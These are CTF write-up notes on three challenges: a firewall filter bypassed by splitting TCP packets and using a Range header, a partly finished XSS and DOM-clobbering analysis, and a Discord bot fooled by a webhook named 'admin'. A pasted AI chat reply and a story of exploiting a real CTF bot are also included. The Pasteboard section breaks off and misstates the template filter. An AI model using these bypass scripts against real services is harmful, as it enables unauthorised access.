# Firewall
## Description 

Free flag at /flag.html

`curl http://35.227.38.232:5000`

## What I tried

```bash
curl -i http://35.227.38.232:5000/flag.html
```
-> Something is stopping traffic


## Explanation

```c
static const char blocked_kw[KW_LEN] = "flag";

static const char blocked_char = '%';
```

That means that The firewall is blocking "flag" and the character '%' for each packet that is sent.
However, I'm trying to send a request for `flag.html` but it get dropped.
En plus, flag is INSIDE OF flag.html (like actually gets returned).

this: `GET /flag.html HTTP/1.1` doesn't work.

Ok, what do we think next.
i have two problems:
1. the request gets dropped cause it contains itself flag
2. the response also is problem it contains flag
so to mitigate both problems i need to separate input and output


```python
python3 <<'PY'
import socket, time

host = "35.227.38.232"
port = 5000

# open a raw tcp socket
s = socket.socket()
# i dont really get it, i just dont want the packets to get combined so this is what i should do ig
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
# TCP_NODELAY = 1 turns that off
s.connect((host, port))

# send first part of request
s.sendall(b"GET /fl")
time.sleep(0.05)

# then send the rest
# Range chosen to grab only "uoft{wtv}" from the provided flag.html
# one byte messages
req = (
    b"ag.html HTTP/1.1\r\n"     # the rest of the request
    b"Host: x\r\n"
    b"Range: bytes=135-144\r\n"  # keep increasing range if needed
    b"Connection: close\r\n"
    b"\r\n"   # end of headers
)
s.sendall(req)

data = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk

print(data.decode(errors="ignore"))
PY
```


# Pasteboard

in `view.html`, I find this:

```html
<template id="rawMsg">{{ msg|e }}</template>
```

`|safe` means: **“don’t escape this; treat it as real HTML.”**

So if you put HTML tags into the note body, they’ll appear as actual elements on the page.

That goes for the content not the title

in `app.py`

```python
def _csp_header(nonce):
	...
	script-src 'nonce-<random>' 'strict-dynamic'
```

CSP (Content Security Policy) is like a rule sheet the browser follows:

- “What scripts are allowed to run?”
- “Where can images load from?”
- “Where can the page connect to (fetch/websocket)?”

This server generates a different CSP per request using a random **nonce** (a one-time token):
`script-src 'nonce-<random>' 'strict-dynamic'`

### What “nonce” means

A nonce is a random string the page gives to scripts it trusts, like:

`<script nonce="abc123" src="/static/app.js"></script>`

If a script tag doesn’t have the right nonce, the browser refuses to run it.

The `nonce` attribute lets you “whitelist” certain inline `script` and `style` elements, while avoiding use of the CSP `unsafe-inline` directive (which would allow _all_ inline `script` and `style`), so you still retain the key CSP feature of disallowing inline `script`/`style` in general.

So the `nonce` attribute is a way to tell browsers the inline contents of a particular script or style element weren’t injected into the document by some (malicious) third party, but were instead put in the document intentionally by whoever controls the server the document is served from.

**Pattern to recognize:**  
If you see `script-src 'nonce-...'` and the app’s scripts have `nonce="{{ nonce }}"`, then **your injected `<script>`won’t run** because you don’t know the nonce.

in `app.js`

```javascript
const el = document.getElementById("errorReporterScript");
...
const s = document.createElement("script");
s.id = "errorReporterScript";
```

in `view.html` (the same place where i have injected)

```html
<script id="errorReporterScript"></script>
```

So I need to forge my own error script that would then be created by the app as an element

### DOM clobbering (concept)

Browsers sometimes expose elements with certain `id`/`name` values as globals on `window`.
So if you can inject HTML, you can sometimes create an element that makes:
- `window.errorReporter` point to your element
- or `window.renderConfig` point to your element

Then the site’s JS “reads a config object”… but it’s actually reading your DOM.

```js
try {

const cfg = window.renderConfig || { mode: (card && card.dataset.mode) || "safe" };

const mode = cfg.mode.toLowerCase();

const clean = DOMPurify.sanitize(raw, { ALLOW_DATA_ATTR: false });

if (card) {

card.innerHTML = clean;

}

if (mode !== "safe") {

console.log("Render mode:", mode);

}

} catch (err) {

window.lastRenderError = err ? String(err) : "unknown";

handleError();

}
```

for handleError() to run, I actually NEED TO FORCE AN ERROR to happen.



# [K&K Training Room](https://play.uoftctf.org/challenges#K&K%20Training%20Room-39)

**Flag:** uoftctf{tr41n_h4rd_w1n_345y_a625e2acd5ed}

----
## Description

The challenge provides a Discord bot interface where players must "check in" to receive the **K&K** role. This role grants access to hidden match coordination channels where the flag is stored. We are provided with the bot's source code (`index.js`) and its environment configuration (`package.json`).

---
## Analysis

1. **The authentication logic:**

The bot relies on a specific configuration to identify administrators:

```js
const CONFIG = {
  ROLE_NAME: 'K&K',
  ADMIN_NAME: 'admin',
  WEBHOOK_NAME: 'K&K Announcer',
  TARGET_GUILD_ID: '1455821434927579198',
};

const isAdmin = (message) => message.author.username === CONFIG.ADMIN_NAME;
```

The `isAdmin` function strictly checks the `message.author.username`. In Discord's API, when a message is sent via a **Webhook**, the `author.username` is set to the name of that Webhook.

2. **The vulnerable command:**

The bot listens for a `!webhook` command:

```js
client.on(Events.MessageCreate, async (message) => {
  if (message.content !== '!webhook') return;
  if (!isAdmin(message)) {
    return message.reply(`Only \`${CONFIG.ADMIN_NAME}\` can set up the K&K announcer webhook.`);
  }
  // ... creates a webhook and replies with the URL
});
```

Because the bot doesn't check if the message is from a real user or a webhook, we can **spoof the admin identity** by creating a webhook named "admin" in a server the bot is in.

3. The goal



Yep — that error makes sense with this bot’s code.

The bot checks **`message.author.username`** (your real Discord _@username_), not your server nickname/display name. So even if you _look_ like “admin” in the server, your actual username probably isn’t exactly `admin`, so `!webhook` gets denied.

### Easiest bypass (no need to change your Discord username)

Use a **webhook** message, because webhook messages have an “author username” equal to the webhook name.

#### Step 1 — Create a webhook you control named `admin`

In **your own server**:

1. Go to the channel you can type in (e.g., `#général`)
    
2. **Edit Channel → Integrations → Webhooks → New Webhook**
    
3. Name it exactly: **admin**
    
4. Copy its webhook URL
    

#### Step 2 — Send `!webhook` _through that webhook_

Run this (replace the URL):

```bash
curl -H "Content-Type: application/json" \
  -d '{"content":"!webhook"}' \
  "WEBHOOK_URL_YOU_COPIED"
```

Now the bot should accept it (because it sees the author username as `admin`) and reply with an embed containing the **K&K Announcer webhook URL** (the one the bot created).

#### Step 3 — Post the check-in button using the bot-created webhook

Use the webhook URL the bot gave you (the “Announcer” one) and send a button:

```bash
curl -H "Content-Type: application/json" \
  -d '{
    "content":"Click to check in:",
    "components":[
      {"type":1,"components":[
        {"type":2,"style":1,"label":"Check In","custom_id":"checkin"}
      ]}
    ]
  }' \
  "BOT_CREATED_WEBHOOK_URL"
```

Click **Check In** → it should give you the **K&K** role in the _target_ server → new channels appear there → flag is inside.

If you paste what the bot replies after Step 2 (just the text/what it says, not the full webhook URL), I can tell you which part to use next.

---

Fun fact - this was a real vulnerability in ez.ctf.cafe that let me view the challenges and submit flags through the bot before the challenge had started.

To do this, you need to enable developer mode in your user settings to get Cafe Bot's ID. Then, right click its profile for the ID 971520199515836456.

Now, we take a random bot's invite link from top.gg, like Mudae's: https://discord.com/oauth2/authorize?client_id=432610292342587392&permissions=537159744&scope=applications.commands%20bot, and change the ID to @Cafe Bot's ID.

I'll also change applications.commands%20bot to bot, meaning we're no longer requesting slash command permissions, but still adding it as a bot, and changing permissions= . . . to permissions=8 to give the bot full administrator permissions.

Now we have our invite: https://discord.com/oauth2/authorize?client_id=971520199515836456&permissions=8&scope=bot

Now, add this bot to any server where you have administrator permissions, and run ?flag in that server. It should give you the flag!

I didn't use it at the time, but another member of the EZ-CTF Discord server suggested using https://discordapi.com/permissions.html to create the invite, and I'd agree that it's much more efficient.

If you're making a bot and want to prevent this, disable the "Public Bot" option in your app's config on https://discord.com/developers. This will make sure that only you can add the bot to a server.


